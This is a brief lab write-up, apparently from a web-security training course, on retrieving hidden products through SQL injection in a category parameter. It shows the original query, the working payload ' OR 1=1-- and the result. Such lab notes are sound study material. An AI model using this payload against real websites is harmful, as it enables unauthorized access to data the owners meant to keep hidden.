# 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
**Goal:**
Retrieve hidden/unreleased products

**Injection point:**
category parameter

**Original query:**
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

**Payload:**
' OR 1=1--

**Result:**
The application displayed unreleased products


